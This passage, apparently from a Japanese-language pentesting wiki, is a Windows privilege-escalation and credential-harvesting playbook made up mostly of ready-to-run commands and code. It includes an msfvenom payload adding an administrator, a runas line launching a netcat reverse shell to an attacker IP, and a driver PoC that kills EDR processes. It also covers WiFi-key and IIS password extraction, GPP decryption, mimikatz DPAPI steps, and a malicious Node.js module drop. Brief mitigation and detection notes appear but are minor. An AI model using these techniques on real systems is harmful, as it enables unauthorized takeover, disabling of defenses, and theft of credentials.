**metasploitでこの脆弱性を検出してexploitできます**: `exploit/windows/local/trusted\_service\_path` metasploitでサービスバイナリを手動作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows では、service が失敗した場合に実行する actions をユーザーが指定できます。この機能は、binary を指すように設定できます。この binary を置き換え可能な場合、privilege escalation が可能になることがあります。詳細については、[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## Applications

### Installed Applications

**binaries の permissions**（いずれかを overwrite して privileges を escalate できる可能性があります）と、folders の permissions（[DLL Hijacking](dll-hijacking/index.html)）を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の設定ファイルを変更して特殊なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内の権限が弱いフォルダーやファイルを見つける方法の一つは、次のコマンドを実行することです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++は`plugins`サブフォルダー内の任意のplugin DLLを自動的にautoloadします。書き込み可能なportable/copy installが存在する場合、悪意のあるpluginを配置することで、起動するたびに`notepad++.exe`内で自動的にcode executionが発生します（`DllMain`およびplugin callbacksからの実行を含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別のuserによって実行されるregistryまたはbinaryをoverwriteできるか確認します。**\
**以下のページを**読んで、**privilege escalationに利用できるautoruns locations**について詳しく学びましょう:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third partyの奇妙な/脆弱な**driversを探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
任意の kernel read/write primitive（設計の悪い IOCTL handler でよく見られます）を driver が公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。step-by-step の technique はこちらを参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

vulnerable call が attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅延させることで（最大長の component や深い directory chain を使用）、window を microseconds から数十 microseconds まで広げられます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive の memory corruption primitive

Modern hive の vulnerability では、deterministic な layout を groom し、writable な HKLM/HKU descendant を悪用して、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain はこちらを参照してください：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled path による `RtlQueryRegistryValues` direct-mode type confusion

一部の driver は userland から registry path を受け取り、それが妥当な UTF-16 string であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を stack scalar（`int readValue` など）に対して `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は developer が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、次の 2 つの有用な primitive が生じます：

- **Confused deputy / oracle**: user-controlled な absolute `\Registry\...` path により、driver は attacker が選択した key を query できます。return code/log によって存在を leak でき、場合によっては caller が直接 access できない value も読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、registry value type に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定された binary buffer として type-confused されます。

実用的な exploitation notes：

- **Windows 8+ mitigation**: query が **untrusted hive** に到達し、`RTL_QUERY_REGISTRY_DIRECT` が使われているにもかかわらず `RTL_QUERY_REGISTRY_TYPECHECK` がない場合、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、`HKCU` 配下に value を staging するのではなく、**trusted system hive 内の attacker-writable key** を探してください。
- **Trusted-hive staging**: NtObjectManager を使って `\Registry\Machine` 配下の writable descendant を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed context から到達可能な key を見つけます：
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte の `int` への 8-byte の直接書き込みにより、隣接する stack データが破壊され、近傍の callback/function pointer の一部が上書きされる可能性がある。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode では、`EntryContext` が `UNICODE_STRING` を指していることを想定する。コードがまず attacker-controlled な `REG_DWORD` を stack scalar に読み込み、その後、同じ buffer を string read に再利用すると、攻撃者が `Length` / `MaximumLength` を制御し、`Buffer` pointer に部分的な影響を与えられるため、semi-controlled な kernel write が発生する。
- **`REG_BINARY`**: 大きな binary data の場合、direct mode は `EntryContext` にある最初の `LONG` を signed buffer size として扱う。以前の `REG_DWORD` read により、再利用された scalar に **negative** な attacker-controlled value が残っていると、次の `REG_BINARY` query が attacker bytes を隣接する stack slots に直接コピーする。これは多くの場合、callback-pointer overwrite を完全に行う最も簡潔な経路となる。

強力な hunting pattern: **同じ stack variable への heterogeneous な registry reads を、再初期化せずに行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された `EntryContext` pointers、および最初の registry read が 2 回目の read を実行するかどうかを制御する code paths を grep する。

#### Device object に FILE_DEVICE_SECURE_OPEN がないことを悪用する (LPE + EDR kill)

一部の署名済み third-party drivers は、IoCreateDeviceSecure によって強力な SDDL を指定して device object を作成するものの、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れている。この flag がない場合、extra component を含む path を通じて device が open される際に、secure DACL が適用されない。そのため、権限のない user でも、次のような namespace path を使用して handle を取得できる。

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

user が device を open できるようになると、driver が公開する privileged IOCTL を LPE および tampering に悪用できる。実環境で確認された capabilities の例:
- 任意の process に対する full-access handles の返却 (token theft / DuplicateTokenEx/CreateProcessAsUser による SYSTEM shell)。
- 制限のない raw disk read/write (offline tampering、boot-time persistence tricks)。
- Protected Process/Light (PP/PPL) を含む任意の process の terminate。これにより、kernel 経由で user land から AV/EDR kill が可能になる。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL による制限を意図したデバイスオブジェクトを作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加する。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネルの直接的な特権ではなく、brokered model の利用を検討する。

防御側向けの検知アイデア
- 疑わしいデバイス名（例: \\ .\\amsdk*）に対する user-mode からのオープンや、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の許可/拒否リストを維持する。


## PATH DLL Hijacking

**PATH 上に存在するフォルダー内への書き込み権限**がある場合、プロセスによって読み込まれる DLL を hijack し、**権限を昇格**できる可能性があります。

PATH 内のすべてのフォルダーの権限を確認します:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
For more information about how to abuse this check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

これは、`require("foo")` のような bare import を実行し、期待される module が **missing** の場合に **Node.js** および **Electron** アプリケーションへ影響する、**Windows uncontrolled search path** の亜種です。

Node はディレクトリツリーを上方向へたどり、各親ディレクトリにある `node_modules` フォルダーを確認して package を解決します。Windows では、この探索がドライブのルートまで到達する可能性があります。そのため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次のパスを探索する可能性があります。

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package フォルダー）を配置し、**高権限の Node/Electron process** が missing dependency を解決するのを待つことができます。payload は被害プロセスの security context で実行されるため、対象が administrator として実行されている場合、昇格された scheduled task/service wrapper から実行されている場合、または自動起動される特権 desktop app の場合、これは **LPE** になります。

これは、特に次のような場合によく発生します。

- dependency が `optionalDependencies` に宣言されている
- third-party library が `require("foo")` を `try/catch` でラップし、失敗時も処理を継続する
- package が production build から削除された、packaging 時に含められなかった、または install に失敗した
- 脆弱な `require()` が main application code ではなく、dependency tree の深い場所に存在する

### 脆弱な対象の探索

解決パスを証明するには **Procmon** を使用します。

- `Process Name` = 対象 executable（`node.exe`、Electron app EXE、または wrapper process）でフィルターする
- `Path` `contains` `node_modules` でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功する open に注目する

unpacked `.asar` ファイルまたは application source で役立つ code-review パターン：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **missing package name** を特定します。
2. 存在しない場合は、root lookup directory を作成します。
```powershell
mkdir C:\node_modules
```
3. 想定される正確な名前でモジュールを配置する:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者のアプリケーションをトリガーします。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに該当する、実際に確認されている欠落した optional module の例には `bluebird` と `utf-8-validate` があります。ただし、再利用可能な部分は**technique**です。特権 Windows Node/Electron プロセスが解決する、任意の**missing bare import**を見つけます。

### 検知と hardening のアイデア

- ユーザーが `C:\node_modules` を作成した場合、またはそこに新しい `.js` ファイルやパッケージを書き込んだ場合にアラートを出す。
- 高い integrity レベルで動作するプロセスが `C:\node_modules\*` から読み取っていないかを調査する。
- production 環境ではすべての runtime dependencies をパッケージ化し、`optionalDependencies` の使用を監査する。
- サードパーティーコードで、`try { require("...") } catch {}` のようなサイレントなパターンを確認する。
- library が対応している場合は optional probe を無効化する（たとえば、一部の `ws` deployment では `WS_NO_UTF_8_VALIDATE=1` により、legacy の `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた、既知の他のコンピューターを確認します
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースと DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から **制限されたサービス** を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォール ルール

[**ファイアウォール関連のコマンドはこちらを確認**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、`nc` による通信を firewall で許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試してください

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows 認証情報

### Winlogon 認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーを**自動的にログインさせることができる**サーバー、Webサイト、その他のプログラムのユーザー認証情報を保存します。一見すると、ユーザーが Facebook の認証情報、Twitter の認証情報、Gmail の認証情報などを保存して、ブラウザー経由で自動的にログインできるように思えるかもしれません。しかし、実際にはそうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるために使用できる認証情報を保存します。つまり、**リソースにアクセスするために認証情報を必要とする Windows アプリケーション**（サーバーまたはWebサイト）は、この Credential Manager と Windows Vault を**利用でき、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された認証情報を使用できます**。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を使用することはできないと思います。したがって、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、そのリソースの認証情報を**既定のストレージ vault から要求する必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB share 経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報を使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、laZagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から取得できることに注意してください。

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化するための方法を提供します。主に Windows オペレーティングシステム内で、非対称暗号方式の秘密鍵を対称暗号化するために使用されます。この暗号化では、ユーザーまたはシステムの secret を利用して、エントロピーに大きく寄与させます。

**DPAPI は、ユーザーのログイン secret から導出された対称鍵を通じて鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証 secret を使用します。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**ユーザーの秘密鍵を保護する master key と同じファイル内に配置された DPAPI key** は、通常、ランダムな 64 バイトのデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドで内容を一覧表示することはできませんが、PowerShell からは一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると復号できます。

**マスターパスワードで保護された認証情報ファイル**は、通常、次の場所にあります。
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使用して復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から多くの DPAPI **masterkeys** を**抽出**できます（root 権限がある場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 認証情報

**PowerShell 認証情報**は、暗号化された認証情報を便利に保存する方法として、**scripting**や自動化タスクでよく使用されます。認証情報は **DPAPI** を使用して保護されます。通常、これは作成時と同じコンピューター上の同じユーザーのみが復号できることを意味します。

認証情報を含むファイルから PS 認証情報を**復号**するには、次のように実行します。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey` を適切に指定した **Mimikatz** の `dpapi::rdg` モジュールを使用して、**任意の .rdg ファイルを復号**する\
Mimikatz の `sekurlsa::dpapi` モジュールを使用すると、メモリから **多数の DPAPI masterkey を抽出**できる

### Sticky Notes

Windows ワークステーションでは、Sticky Notes アプリを使って **パスワード**やその他の情報を**保存**している人が多くいますが、これがデータベースファイルであることに気付いていない場合があります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの **credentials** が設定されており、**復元できる**可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました。
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行される**ため、多くの場合 **DLL Sideloading（情報元：** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（Credentials）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されている場合があるため、そこに興味深いものがないか確認してください。
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、おそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この technique の詳細については、こちらを参照してください: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されておらず、boot 時に自動的に起動したい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh key を作成し、`ssh-add` で追加してから、ssh 経由でマシンにログインしてみました。しかし、レジストリの HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` が使用されたことを確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使用して、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

コンテンツ例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を介して、複数のマシンにカスタムのローカル administrator アカウントを配布できる機能がありました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPOs) は、すべての domain user がアクセスできました。第二に、これらの GPP 内の password は、公開されているデフォルトキーを使用して AES256 で暗号化されていましたが、認証済みの user であれば誰でも復号できました。これにより、user が elevated privileges を取得できる可能性があり、深刻なリスクとなっていました。

このリスクを軽減するため、空でない `"cpassword"` フィールドを含む、ローカルに cache された GPP ファイルを検索する function が開発されました。このようなファイルが見つかると、function は password を復号し、カスタム PowerShell object を返します。この object には、GPP に関する details とファイルの location が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
